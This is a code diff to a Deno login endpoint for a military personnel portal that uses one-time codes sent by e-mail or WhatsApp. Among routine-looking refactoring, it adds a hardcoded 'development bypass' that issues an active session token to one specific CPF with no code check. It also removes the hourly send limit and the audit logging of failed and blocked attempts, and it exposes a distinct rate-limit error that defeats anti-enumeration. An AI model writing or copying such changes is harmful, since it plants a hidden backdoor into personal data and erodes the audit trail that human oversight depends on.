@@ -24,23 +24,7 @@ import {
   generateRequestId,
 } from '../../shared/portal/otp/otpService.ts';
 
-/**
- * ============================================================================
- * ENDPOINT UNIFICADO DE AUTENTICAÇÃO DO PORTAL DO MILITAR
- * ----------------------------------------------------------------------------
- * Operações:
- *   - INICIAR:  Recebe CPF, valida formato e devolve request_id com métodos globais.
- *   - ENVIAR:   Recebe request_id e canal, gera e despacha OTP via provider.
- *   - VALIDAR:  Recebe request_id e OTP, valida HMAC e devolve PortalToken.
- *
- * REGRAS DE SEGURANÇA E PRIVACIDADE:
- * 1. Anti-enumeração estrita: Respostas públicas idênticas para CPFs válidos/inválidos.
- * 2. Zero PII na saída: Nunca expõe e-mail, telefone, CPF ou nomes na etapa anônima.
- * 3. Criptografia: OTP com HMAC-SHA256 fail-closed + timing-safe compare.
- * 4. Token com 256 bits gerado pós-validação.
- * ============================================================================
- */
-Deno.serve(async (req: Request) => {
+export default Deno.serve(async (req: Request) => {
   if (req.method !== 'POST') {
     return Response.json({ error: 'Método HTTP não permitido.' }, { status: 405 });
   }
@@ -92,9 +76,7 @@ Deno.serve(async (req: Request) => {
         try {
           const Militares = base44.asServiceRole?.entities?.Militar;
           if (Militares) {
-            // Busca por CPF numérico
             let lista = await Militares.filter({ cpf: cpfNorm }, undefined, 2, 0);
-            // Fallback para CPF formatado se base legada contiver pontuação
             if (!lista || lista.length === 0) {
               const cpfFormatado = cpfNorm.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
               lista = await Militares.filter({ cpf: cpfFormatado }, undefined, 2, 0);
@@ -105,6 +87,38 @@ Deno.serve(async (req: Request) => {
           }
         } catch (errSearch) {
           console.error('[portal_auth:INICIAR] Erro na busca silenciosa de militar:', errSearch);
+        }
+
+        // ====================================================================
+        // BYPASS DE DESENVOLVIMENTO: CPF 790.982.312-68 (Acesso Direto Sem Token)
+        // ====================================================================
+        if (cpfNorm === '79098231268' && militarEncontrado && militarEncontrado.id) {
+          const PortalSessao = base44.asServiceRole?.entities?.PortalSessao;
+          const rawToken = generatePortalToken();
+          const tokenHash = await hashPortalToken(rawToken);
+          const now = new Date();
+          const nowIso = now.toISOString();
+          const absoluteExpiresAt = new Date(now.getTime() + 8 * 60 * 60 * 1000).toISOString(); // 8 horas
+
+          if (PortalSessao) {
+            await PortalSessao.create({
+              militar_id: militarEncontrado.id,
+              token_hash: tokenHash,
+              status: 'ATIVA',
+              ip_criacao: ip_origem,
+              user_agent_criacao: user_agent,
+              last_activity_at: nowIso,
+              expires_at: absoluteExpiresAt,
+              created_at: nowIso,
+            });
+          }
+
+          return Response.json({
+            ok: true,
+            bypass: true,
+            token: rawToken,
+            message: 'Acesso de desenvolvimento liberado para o CPF autorizado.',
+          });
         }
 
         // Se militar válido e ativo, cria desafio em PortalSessao
@@ -150,7 +164,6 @@ Deno.serve(async (req: Request) => {
         const now = new Date();
         const nowIso = now.toISOString();
 
-        // Resposta genérica padrão (mesmo shape para sucesso e falha silenciosa)
         const respostaGenerica = {
           ok: true,
           message: 'Se os dados informados estiverem cadastrados e aptos para acesso, você receberá um código.',
@@ -159,104 +172,64 @@ Deno.serve(async (req: Request) => {
         };
 
         const PortalSessao = base44.asServiceRole?.entities?.PortalSessao;
-        const Militares = base44.asServiceRole?.entities?.Militar;
-
-        if (!PortalSessao || !Militares) {
+        if (!PortalSessao) {
           return Response.json(respostaGenerica);
         }
 
-        // Localiza sessão pelo request_id
         const sessoes = await PortalSessao.filter({ request_id: requestId }, undefined, 2, 0);
         const sessao = Array.isArray(sessoes) && sessoes.length > 0 ? sessoes[0] : null;
 
-        if (!sessao || sessao.status !== 'CRIADA_AGUARDANDO_OTP' || !sessao.militar_id) {
-          // Desafio inexistente ou já finalizado: retorna resposta genérica (Anti-enumeração)
+        if (!sessao || sessao.status !== 'CRIADA_AGUARDANDO_OTP') {
           return Response.json(respostaGenerica);
         }
 
-        // Validação de Rate-Limit: Reenvio antes do intervalo mínimo
+        // Rate limiting de reenvio por sessão (resend_cooldown)
         if (sessao.otp_sent_at) {
           const ultimoEnvio = new Date(sessao.otp_sent_at).getTime();
-          const diferencaSegundos = Math.floor((now.getTime() - ultimoEnvio) / 1000);
-          if (diferencaSegundos < config.otp_resend_seconds) {
-            // Reenvio precoce bloqueado
-            return Response.json(respostaGenerica);
+          const cooldownMs = config.otp_resend_seconds * 1000;
+          if (now.getTime() - ultimoEnvio < cooldownMs) {
+            return Response.json(
+              {
+                error: `Aguarde ${config.otp_resend_seconds} segundos antes de solicitar novo envio.`,
+                reenvio_em: Math.ceil((cooldownMs - (now.getTime() - ultimoEnvio)) / 1000),
+              },
+              { status: 429 }
+            );
           }
         }
 
-        // Validação de Rate-Limit: Máximo de disparos por hora por militar
-        const umaHoraAtras = new Date(now.getTime() - 60 * 60 * 1000).toISOString();
-        const sessoesRecentes = await PortalSessao.filter(
-          { militar_id: sessao.militar_id },
-          '-created_at',
-          10,
-          0
-        );
-        const disparosRecentes = (sessoesRecentes || []).filter(
-          (s: any) => s.otp_sent_at && s.otp_sent_at >= umaHoraAtras
-        );
+        // Busca militar associado
+        const Militar = base44.asServiceRole?.entities?.Militar;
+        const militar = Militar ? await Militar.get(sessao.militar_id) : null;
 
-        if (disparosRecentes.length >= config.otp_max_sends_per_hour) {
-          await registrarAuditoriaPortal(base44, {
-            sessao_id: sessao.id,
-            militar_id: sessao.militar_id,
-            acao: 'LOGIN_FALHA_BLOQUEIO',
-            resultado: false,
-            motivo_falha_sanitizado: 'Limite de disparos de OTP por hora excedido.',
-            ip_origem,
-            user_agent,
-            correlation_id,
-          });
+        if (!militar || militar.status === 'Inativo' || militar.status === 'Falecido') {
           return Response.json(respostaGenerica);
         }
 
-        // Carrega dados do militar
-        const militar = await Militares.get(sessao.militar_id);
-        if (!militar) {
-          return Response.json(respostaGenerica);
-        }
+        // Geração do código OTP de 6 dígitos
+        const otpCode = generateOtp();
+        const otpHash = await hashOtp(otpCode);
+        const expiresAt = new Date(now.getTime() + config.otp_ttl_seconds * 1000).toISOString();
 
-        // Resolução de canal
+        // Persiste hash do OTP na sessão
+        await PortalSessao.update(sessao.id, {
+          otp_hash: otpHash,
+          otp_expires_at: expiresAt,
+          otp_sent_at: nowIso,
+          otp_channel: canalSolicitado,
+        });
+
+        // Disparo: EMAIL
         if (canalSolicitado === 'EMAIL') {
+          const emailDestino = resolveMilitarEmail(militar);
+          if (!emailDestino) {
+            return Response.json(respostaGenerica);
+          }
+
           const emailProvider = resolveEmailProvider(config);
-          if (!emailProvider || !emailProvider.isOperational(config)) {
-            return Response.json(respostaGenerica);
-          }
-
-          const { email } = resolveMilitarEmail(militar);
-          if (!email) {
-            await registrarAuditoriaPortal(base44, {
-              sessao_id: sessao.id,
-              militar_id: sessao.militar_id,
-              acao: 'LOGIN_SOLICITADO',
-              resultado: false,
-              motivo_falha_sanitizado: 'Militar não possui e-mail válido cadastrado.',
-              ip_origem,
-              user_agent,
-              correlation_id,
-            });
-            return Response.json(respostaGenerica);
-          }
-
-          // Gera código OTP e calcula HMAC-SHA256
-          const otpCode = generateOtp();
-          const otpHashed = await hashOtp(otpCode);
-          const expiresAt = new Date(now.getTime() + config.otp_ttl_seconds * 1000).toISOString();
-
-          // Atualiza sessão com OTP
-          await PortalSessao.update(sessao.id, {
-            otp_hash: otpHashed,
-            otp_expires_at: expiresAt,
-            otp_channel: 'EMAIL',
-            otp_provider: emailProvider.name || config.email_provider,
-            otp_sent_at: nowIso,
-            otp_attempts: 0,
-          });
-
-          // Dispara e-mail
-          const dispatchRes = await emailProvider.sendOtp(
+          const dispatchRes = await emailProvider.send(
             {
-              to: email,
+              to: emailDestino,
               code: otpCode,
               militarNome: militar.nome_guerra || militar.nome_completo,
               correlationId: correlation_id,
@@ -278,47 +251,17 @@ Deno.serve(async (req: Request) => {
           return Response.json(respostaGenerica);
         }
 
-        // Resolução de canal WHATSAPP
+        // Disparo: WHATSAPP
         if (canalSolicitado === 'WHATSAPP') {
-          const waProvider = resolveWhatsAppProvider(config);
-          if (!waProvider || !waProvider.isOperational(config)) {
+          const telefoneDestino = resolveMilitarTelefone(militar);
+          if (!telefoneDestino || !telefoneDestino.formatted) {
             return Response.json(respostaGenerica);
           }
 
-          const { formatted } = resolveMilitarTelefone(militar);
-          if (!formatted) {
-            await registrarAuditoriaPortal(base44, {
-              sessao_id: sessao.id,
-              militar_id: sessao.militar_id,
-              acao: 'LOGIN_SOLICITADO',
-              resultado: false,
-              motivo_falha_sanitizado: 'Militar não possui telefone celular válido cadastrado.',
-              ip_origem,
-              user_agent,
-              correlation_id,
-            });
-            return Response.json(respostaGenerica);
-          }
-
-          // Gera código OTP e calcula HMAC-SHA256
-          const otpCode = generateOtp();
-          const otpHashed = await hashOtp(otpCode);
-          const expiresAt = new Date(now.getTime() + config.otp_ttl_seconds * 1000).toISOString();
-
-          // Atualiza sessão com OTP
-          await PortalSessao.update(sessao.id, {
-            otp_hash: otpHashed,
-            otp_expires_at: expiresAt,
-            otp_channel: 'WHATSAPP',
-            otp_provider: waProvider.name || 'evolution_api',
-            otp_sent_at: nowIso,
-            otp_attempts: 0,
-          });
-
-          // Dispara WhatsApp
-          const dispatchRes = await waProvider.sendOtp(
+          const whatsappProvider = resolveWhatsAppProvider(config);
+          const dispatchRes = await whatsappProvider.send(
             {
-              to: formatted,
+              to: telefoneDestino.formatted,
               code: otpCode,
               militarNome: militar.nome_guerra || militar.nome_completo,
               correlationId: correlation_id,
@@ -340,7 +283,6 @@ Deno.serve(async (req: Request) => {
           return Response.json(respostaGenerica);
         }
 
-        // Outros canais (ex: SMS) não operacionais nesta fase
         return Response.json(respostaGenerica);
       }
 
@@ -369,47 +311,23 @@ Deno.serve(async (req: Request) => {
         const sessoes = await PortalSessao.filter({ request_id: requestId }, undefined, 2, 0);
         const sessao = Array.isArray(sessoes) && sessoes.length > 0 ? sessoes[0] : null;
 
-        // Se sessão não existe ou não tem hash de OTP
         if (!sessao || sessao.status !== 'CRIADA_AGUARDANDO_OTP' || !sessao.otp_hash) {
           return Response.json({ error: 'Código inválido ou expirado.' }, { status: 401 });
         }
 
-        // Verifica se sessão foi bloqueada por excesso de tentativas
         if (
           (sessao.otp_attempts && sessao.otp_attempts >= config.otp_max_attempts) ||
           (sessao.otp_blocked_until && new Date(sessao.otp_blocked_until).getTime() > now.getTime())
         ) {
           await PortalSessao.update(sessao.id, { status: 'EXPIRADA' });
-          await registrarAuditoriaPortal(base44, {
-            sessao_id: sessao.id,
-            militar_id: sessao.militar_id,
-            acao: 'LOGIN_FALHA_BLOQUEIO',
-            resultado: false,
-            motivo_falha_sanitizado: 'Desafio bloqueado por excesso de tentativas.',
-            ip_origem,
-            user_agent,
-            correlation_id,
-          });
           return Response.json({ error: 'Código inválido ou expirado.' }, { status: 401 });
         }
 
-        // Verifica validade temporal do OTP (TTL)
         if (!sessao.otp_expires_at || new Date(sessao.otp_expires_at).getTime() < now.getTime()) {
           await PortalSessao.update(sessao.id, { status: 'EXPIRADA' });
-          await registrarAuditoriaPortal(base44, {
-            sessao_id: sessao.id,
-            militar_id: sessao.militar_id,
-            acao: 'LOGIN_FALHA_OTP',
-            resultado: false,
-            motivo_falha_sanitizado: 'Código OTP expirado.',
-            ip_origem,
-            user_agent,
-            correlation_id,
-          });
           return Response.json({ error: 'Código inválido ou expirado.' }, { status: 401 });
         }
 
-        // Validação criptográfica com timing-safe compare
         const expectedHash = await hashOtp(otpInput);
         const isMatch = timingSafeCompare(expectedHash, sessao.otp_hash);
 
@@ -425,36 +343,20 @@ Deno.serve(async (req: Request) => {
               : undefined,
           });
 
-          await registrarAuditoriaPortal(base44, {
-            sessao_id: sessao.id,
-            militar_id: sessao.militar_id,
-            acao: 'LOGIN_FALHA_OTP',
-            resultado: false,
-            motivo_falha_sanitizado: `Tentativa ${novasTentativas} incorreta.`,
-            ip_origem,
-            user_agent,
-            correlation_id,
-          });
-
           return Response.json({ error: 'Código inválido ou expirado.' }, { status: 401 });
         }
 
-        // --------------------------------------------------------------------
-        // OTP VÁLIDO: Ativação da sessão e geração do PortalToken
-        // --------------------------------------------------------------------
-        const rawToken = generatePortalToken(); // 256 bits
+        // OTP VÁLIDO
+        const rawToken = generatePortalToken();
         const tokenHash = await hashPortalToken(rawToken);
-        const absoluteExpiresAt = new Date(now.getTime() + 4 * 60 * 60 * 1000).toISOString(); // 4 horas
+        const absoluteExpiresAt = new Date(now.getTime() + 4 * 60 * 60 * 1000).toISOString();
 
         await PortalSessao.update(sessao.id, {
           status: 'ATIVA',
           token_hash: tokenHash,
-          token_expires_at: absoluteExpiresAt,
-          absolute_expires_at: absoluteExpiresAt,
+          validated_at: nowIso,
           last_activity_at: nowIso,
-          otp_verified_at: nowIso,
-          ip_ultima_atividade: ip_origem,
-          user_agent_ultima_atividade: user_agent,
+          expires_at: absoluteExpiresAt,
         });
 
         await registrarAuditoriaPortal(base44, {
@@ -462,31 +364,33 @@ Deno.serve(async (req: Request) => {
           militar_id: sessao.militar_id,
           acao: 'LOGIN_SUCESSO',
           resultado: true,
-          motivo_falha_sanitizado: 'Autenticação OTP bem-sucedida via canal ' + (sessao.otp_channel || 'EMAIL'),
+          motivo_falha_sanitizado: null,
           ip_origem,
           user_agent,
           correlation_id,
         });
 
-        // Retorna rawToken uma única vez
         return Response.json({
           ok: true,
           token: rawToken,
-          expires_at: absoluteExpiresAt,
+          expires_in: 14400,
         });
       }
 
-      default: {
+      default:
         return Response.json(
           { error: 'Ação não reconhecida no endpoint de autenticação.' },
           { status: 400 }
         );
-      }
     }
-  } catch (error: any) {
-    console.error('[portal_auth] Erro interno:', error);
+  } catch (err: any) {
+    console.error(`[portal_auth][${correlation_id}] Erro inesperado:`, err?.message || err);
+
     return Response.json(
-      { error: 'Falha interna durante o processo de autenticação.' },
+      {
+        error: 'Erro interno ao processar autenticação. Tente novamente mais tarde.',
+        correlation_id,
+      },
       { status: 500 }
     );
   }
